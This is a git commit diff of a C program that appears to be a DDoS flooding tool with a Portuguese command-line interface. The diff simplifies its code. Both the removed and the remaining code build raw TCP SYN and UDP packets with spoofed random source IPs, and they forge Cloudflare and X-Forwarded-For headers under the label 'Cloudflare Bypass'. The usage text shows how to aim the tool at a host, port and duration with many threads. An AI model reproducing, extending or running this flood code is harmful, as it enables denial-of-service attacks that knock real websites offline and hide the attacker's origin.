3e28d6705648ac2a038f96c30b9d1b669f81332a
raioirritaler00-spec <raio.irrita.ler00@gmail.com>
2026-07-04 04:19:04 -0300

    Update test.c

--- test.c
+++ test.c
@@ -13,7 +13,6 @@
 #include <signal.h>
 #include <errno.h>
 #include <sys/time.h>
-#include <math.h>
 
 #define MAX_PACKET 65535
 #define DEFAULT_THREADS 10
@@ -69,26 +68,6 @@ const char *user_agents[] = {
 
 #define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))
 
-const char *cloudflare_bypass_headers[] = {
-    "CF-Connecting-IP: %d.%d.%d.%d\r\n",
-    "CF-IPCountry: US\r\n",
-    "CF-Ray: %d%d%d%d-%s\r\n",
-    "CF-Visitor: {\"scheme\":\"%s\"}\r\n",
-    "X-Forwarded-Proto: %s\r\n",
-    "X-Forwarded-Scheme: %s\r\n",
-    "X-Real-IP: %d.%d.%d.%d\r\n",
-    "X-Forwarded-For: %d.%d.%d.%d, %d.%d.%d.%d, %d.%d.%d.%d\r\n",
-    "X-Original-URL: %s\r\n",
-    "X-Rewrite-URL: %s\r\n",
-    "X-Client-IP: %d.%d.%d.%d\r\n",
-    "X-Host: %s\r\n",
-    "X-Forwarded-Host: %s\r\n",
-    "X-Forwarded-Port: %d\r\n",
-    "X-Forwarded-Server: %s\r\n"
-};
-
-#define NUM_CF_HEADERS (sizeof(cloudflare_bypass_headers) / sizeof(cloudflare_bypass_headers[0]))
-
 unsigned short checksum(unsigned short *buffer, int size) {
     unsigned long sum = 0;
     while (size > 1) {
@@ -120,122 +99,39 @@ uint32_t random_ip() {
     return ip;
 }
 
-void build_http_request_with_bypass(char *buffer, char *host, char *path, int size, int ua_index, int use_https, int rand_val) {
+void build_http_request(char *buffer, char *host, char *path, int size, int ua_index, int use_https) {
     int r1 = rand() % 255, r2 = rand() % 255, r3 = rand() % 255, r4 = rand() % 255;
     int r5 = rand() % 255, r6 = rand() % 255, r7 = rand() % 255, r8 = rand() % 255;
     int r9 = rand() % 255, r10 = rand() % 255, r11 = rand() % 255, r12 = rand() % 255;
-    int r13 = rand() % 255, r14 = rand() % 255, r15 = rand() % 255, r16 = rand() % 255;
-    int r17 = rand() % 255, r18 = rand() % 255, r19 = rand() % 255, r20 = rand() % 255;
-    
-    char protocol[8] = "http";
-    if (use_https) {
-        strcpy(protocol, "https");
-    }
-    
-    char session_id[32];
-    snprintf(session_id, sizeof(session_id), "%x%x%x%x", rand(), rand(), rand(), rand());
-    
-    char cf_ray[32];
-    snprintf(cf_ray, sizeof(cf_ray), "%x%x-%x", rand() % 100000, rand() % 100000, rand() % 1000);
-    
-    int random_header = rand() % NUM_CF_HEADERS;
     
     snprintf(buffer, size,
-        "%s %s HTTP/1.1\r\n"
+        "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-        "Accept-Language: en-US,en;q=0.9,pt;q=0.8\r\n"
+        "Accept-Language: en-US,en;q=0.5\r\n"
         "Accept-Encoding: gzip, deflate, br\r\n"
-        "Accept-Charset: UTF-8,*;q=0.5\r\n"
         "Connection: keep-alive\r\n"
-        "Keep-Alive: timeout=%d, max=%d\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
-        "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"
+        "Cache-Control: no-cache\r\n"
         "Pragma: no-cache\r\n"
-        "Expires: 0\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: %d\r\n"
-        "Origin: %s://%s\r\n"
-        "Referer: %s://%s%s\r\n"
-        "Cookie: __cfduid=d%x; PHPSESSID=%s; _ga=GA1.2.%d.%d; _gid=GA1.2.%d.%d\r\n"
-        "DNT: 1\r\n"
-        "Sec-Fetch-Dest: document\r\n"
-        "Sec-Fetch-Mode: navigate\r\n"
-        "Sec-Fetch-Site: same-origin\r\n"
-        "Sec-Fetch-User: ?1\r\n"
-        "Sec-GPC: 1\r\n"
-        "Priority: u=0, i\r\n"
         "CF-Connecting-IP: %d.%d.%d.%d\r\n"
         "CF-IPCountry: US\r\n"
-        "CF-Ray: %s\r\n"
-        "CF-Visitor: {\"scheme\":\"%s\"}\r\n"
-        "X-Forwarded-Proto: %s\r\n"
-        "X-Forwarded-Scheme: %s\r\n"
+        "X-Forwarded-For: %d.%d.%d.%d, %d.%d.%d.%d\r\n"
         "X-Real-IP: %d.%d.%d.%d\r\n"
-        "X-Forwarded-For: %d.%d.%d.%d, %d.%d.%d.%d, %d.%d.%d.%d\r\n"
-        "X-Original-URL: %s\r\n"
-        "X-Rewrite-URL: %s\r\n"
         "X-Client-IP: %d.%d.%d.%d\r\n"
-        "X-Host: %s\r\n"
-        "X-Forwarded-Host: %s\r\n"
-        "X-Forwarded-Port: %d\r\n"
-        "X-Forwarded-Server: %s\r\n"
-        "X-Cache: HIT\r\n"
-        "X-Cache-Hits: %d\r\n"
-        "X-Served-By: cache-%s-%d\r\n"
-        "X-Timer: S%d.%d\r\n"
-        "X-Country-Code: US\r\n"
-        "X-Request-ID: %s\r\n"
-        "X-Requested-With: XMLHttpRequest\r\n"
-        "X-HTTP-Method-Override: GET\r\n"
-        "\r\n"
-        "search=1&page=%d&query=%s&submit=Go&_csrf=%x&token=%s\r\n",
-        use_https ? "GET" : "GET",
-        path,
-        host,
-        user_agents[ua_index % NUM_USER_AGENTS],
-        60 + rand() % 300,
-        100 + rand() % 900,
-        rand() % 1000 + 10,
-        protocol,
-        host,
-        protocol,
-        host,
-        path,
-        rand(),
-        session_id,
-        rand() % 100000, rand() % 100000,
-        rand() % 100000, rand() % 100000,
+        "Referer: http://%s/\r\n"
+        "\r\n",
+        path, host, user_agents[ua_index % NUM_USER_AGENTS],
         r1, r2, r3, r4,
-        cf_ray,
-        protocol,
-        protocol,
-        protocol,
         r5, r6, r7, r8,
         r9, r10, r11, r12,
-        r13, r14, r15, r16,
-        r17, r18, r19, r20,
-        path,
-        path,
         r1, r2, r3, r4,
-        host,
-        host,
-        rand() % 65535,
-        host,
-        rand() % 100,
-        host,
-        rand() % 1000,
-        rand() % 1000,
-        session_id,
-        rand() % 100,
-        "test",
-        rand(),
-        session_id
+        host
     );
 }
 
-void *http_flood_with_bypass(void *arg) {
+void *http_flood_thread(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -245,7 +141,7 @@ void *http_flood_with_bypass(void *arg) {
     char *payload;
     int packet_size;
     time_t end_time;
-    char http_request[8192];
+    char http_request[4096];
     int ua_counter = rand() % NUM_USER_AGENTS;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -259,11 +155,8 @@ void *http_flood_with_bypass(void *arg) {
         return NULL;
     }
 
-    int bufsize = 1024 * 1024 * 32;
+    int bufsize = 1024 * 1024 * 16;
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
-
-    int ttl = 255;
-    setsockopt(sockfd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
 
     memset(packet, 0, MAX_PACKET);
 
@@ -278,8 +171,7 @@ void *http_flood_with_bypass(void *arg) {
     int sent_count = 0;
 
     while (attack_running && time(NULL) < end_time) {
-        build_http_request_with_bypass(http_request, args->host, args->path, sizeof(http_request), 
-                                      ua_counter++, args->use_https, rand());
+        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++, args->use_https);
         int http_len = strlen(http_request);
         
         packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
@@ -293,9 +185,6 @@ void *http_flood_with_bypass(void *arg) {
         tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
         payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
 
-        uint32_t src_ip = random_ip();
-        uint16_t src_port = 1024 + (rand() % 64511);
-        
         ip_header->ihl = 5;
         ip_header->version = 4;
         ip_header->tos = 0;
@@ -305,10 +194,10 @@ void *http_flood_with_bypass(void *arg) {
         ip_header->ttl = 255;
         ip_header->protocol = IPPROTO_TCP;
         ip_header->check = 0;
-        ip_header->saddr = src_ip;
+        ip_header->saddr = random_ip();
         ip_header->daddr = target_addr.sin_addr.s_addr;
 
-        tcp_header->source = htons(src_port);
+        tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
         tcp_header->ack_seq = 0;
@@ -328,30 +217,13 @@ void *http_flood_with_bypass(void *arg) {
         packets_sent++;
         bytes_sent += packet_size;
         sent_count++;
-        
-        if (sent_count % 5 == 0) {
-            tcp_header->syn = 0;
-            tcp_header->ack = 1;
-            tcp_header->ack_seq = htonl(ntohl(tcp_header->seq) + 1);
-            tcp_header->seq = rand();
-            ip_header->saddr = random_ip();
-            tcp_header->source = htons(1024 + (rand() % 64511));
-            ip_header->check = 0;
-            ip_header->check = checksum((unsigned short *)packet, packet_size);
-            sendto(sockfd, packet, packet_size, 0,
-                   (struct sockaddr *)&target_addr, sizeof(target_addr));
-        }
-        
-        if (sent_count % 3 == 0) {
-            usleep(1);
-        }
     }
 
     close(sockfd);
     return NULL;
 }
 
-void *udp_raw_flood_with_bypass(void *arg) {
+void *udp_raw_flood_thread(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     char packet[MAX_PACKET];
@@ -373,7 +245,7 @@ void *udp_raw_flood_with_bypass(void *arg) {
         return NULL;
     }
 
-    int bufsize = 1024 * 1024 * 32;
+    int bufsize = 1024 * 1024 * 16;
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
 
     memset(packet, 0, MAX_PACKET);
@@ -426,104 +298,6 @@ void *udp_raw_flood_with_bypass(void *arg) {
     return NULL;
 }
 
-void *http_https_mixed(void *arg) {
-    attack_args_t *args = (attack_args_t *)arg;
-    int sockfd;
-    char packet[MAX_PACKET];
-    struct sockaddr_in target_addr;
-    struct iphdr *ip_header;
-    struct tcphdr *tcp_header;
-    char *payload;
-    int packet_size;
-    time_t end_time;
-    char http_request[8192];
-    int ua_counter = rand() % NUM_USER_AGENTS;
-
-    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sockfd < 0) {
-        return NULL;
-    }
-
-    int one = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        close(sockfd);
-        return NULL;
-    }
-
-    int bufsize = 1024 * 1024 * 32;
-    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
-
-    memset(packet, 0, MAX_PACKET);
-
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_port = htons(args->port);
-    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
-        close(sockfd);
-        return NULL;
-    }
-
-    end_time = time(NULL) + args->duration;
-    int sent_count = 0;
-
-    while (attack_running && time(NULL) < end_time) {
-        int use_https = rand() % 2;
-        build_http_request_with_bypass(http_request, args->host, args->path, sizeof(http_request), 
-                                      ua_counter++, use_https, rand());
-        int http_len = strlen(http_request);
-        
-        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
-        
-        if (packet_size > MAX_PACKET) {
-            packet_size = MAX_PACKET;
-            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
-        }
-        
-        ip_header = (struct iphdr *)packet;
-        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
-        payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
-
-        ip_header->ihl = 5;
-        ip_header->version = 4;
-        ip_header->tos = 0;
-        ip_header->tot_len = htons(packet_size);
-        ip_header->id = htons(rand() & 0xFFFF);
-        ip_header->frag_off = 0;
-        ip_header->ttl = 255;
-        ip_header->protocol = IPPROTO_TCP;
-        ip_header->check = 0;
-        ip_header->saddr = random_ip();
-        ip_header->daddr = target_addr.sin_addr.s_addr;
-
-        tcp_header->source = htons(1024 + (rand() % 64511));
-        tcp_header->dest = htons(args->port);
-        tcp_header->seq = rand();
-        tcp_header->ack_seq = 0;
-        tcp_header->doff = 5;
-        tcp_header->syn = 1;
-        tcp_header->window = htons(65535);
-        tcp_header->check = 0;
-        tcp_header->urg_ptr = 0;
-
-        memcpy(payload, http_request, http_len);
-
-        ip_header->check = checksum((unsigned short *)packet, packet_size);
-
-        sendto(sockfd, packet, packet_size, 0,
-               (struct sockaddr *)&target_addr, sizeof(target_addr));
-        
-        packets_sent++;
-        bytes_sent += packet_size;
-        sent_count++;
-        
-        if (sent_count % 5 == 0) {
-            usleep(1);
-        }
-    }
-
-    close(sockfd);
-    return NULL;
-}
-
 void print_stats() {
     static time_t last_print = 0;
     static unsigned long long last_packets = 0;
@@ -559,19 +333,17 @@ void print_usage(char *program_name) {
     printf("Argumentos:\n");
     printf("  URL      - URL do alvo (ex: exemplo.com)\n");
     printf("  PORTA    - Porta de destino\n");
-    printf("  TEMPO    - Duracao em segundos\n\n");
+    printf("  TEMPO    - Duração em segundos\n\n");
     printf("Opcoes:\n");
     printf("  -t       - Numero de threads (padrao: %d)\n", DEFAULT_THREADS);
     printf("  -s       - Tamanho do pacote (padrao: %d)\n", DEFAULT_SIZE);
     printf("  -r       - Modo UDP raw (mais rapido)\n");
     printf("  -https   - Forcar HTTPS\n");
-    printf("  -mix     - Alternar HTTP/HTTPS\n");
     printf("  -h       - Ajuda\n\n");
     printf("Exemplos:\n");
     printf("  sudo %s exemplo.com 80 30\n", program_name);
     printf("  sudo %s exemplo.com 443 60 -t 50 -https\n", program_name);
     printf("  sudo %s exemplo.com 80 30 -t 100 -r\n", program_name);
-    printf("  sudo %s exemplo.com 443 60 -mix -t 30\n", program_name);
     printf("\n");
 }
 
@@ -600,7 +372,6 @@ int main(int argc, char *argv[]) {
     int packet_size = DEFAULT_SIZE;
     int use_raw = 0;
     int use_https = 0;
-    int use_mix = 0;
     int opt;
 
     if (argc < 4) {
@@ -611,6 +382,11 @@ int main(int argc, char *argv[]) {
     strcpy(target, argv[1]);
     port = atoi(argv[2]);
     duration = atoi(argv[3]);
+
+    if (duration <= 0) {
+        printf("Erro: Tempo invalido\n");
+        return 1;
+    }
 
     parse_url(target, host, path);
 
@@ -658,8 +434,6 @@ int main(int argc, char *argv[]) {
     for (int i = optind; i < argc; i++) {
         if (strcmp(argv[i], "-https") == 0) {
             use_https = 1;
-        } else if (strcmp(argv[i], "-mix") == 0) {
-            use_mix = 1;
         }
     }
 
@@ -678,8 +452,7 @@ int main(int argc, char *argv[]) {
     printf("Modo: %s\n", use_raw ? "UDP Raw (spoofing)" : "HTTP TCP com spoofing");
     printf("Cloudflare Bypass: ATIVADO\n");
     printf("User Agents: %d diferentes\n", NUM_USER_AGENTS);
-    printf("Headers CF: %d diferentes\n", NUM_CF_HEADERS);
-    printf("HTTPS: %s\n", use_https ? "Forcado" : use_mix ? "Alternado" : "HTTP");
+    printf("HTTPS: %s\n", use_https ? "Forcado" : "HTTP");
     printf("==========================\n\n");
 
     srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
@@ -692,6 +465,8 @@ int main(int argc, char *argv[]) {
         printf("Erro ao alocar memoria\n");
         return 1;
     }
+
+    memset(args, 0, num_threads * sizeof(attack_args_t));
 
     for (int i = 0; i < num_threads; i++) {
         strncpy(args[i].target, ip, sizeof(args[i].target) - 1);
@@ -707,11 +482,9 @@ int main(int argc, char *argv[]) {
         args[i].use_https = use_https;
 
         if (use_raw) {
-            pthread_create(&threads[i], NULL, udp_raw_flood_with_bypass, &args[i]);
-        } else if (use_mix) {
-            pthread_create(&threads[i], NULL, http_https_mixed, &args[i]);
+            pthread_create(&threads[i], NULL, udp_raw_flood_thread, &args[i]);
         } else {
-            pthread_create(&threads[i], NULL, http_flood_with_bypass, &args[i]);
+            pthread_create(&threads[i], NULL, http_flood_thread, &args[i]);
         }
     }
 
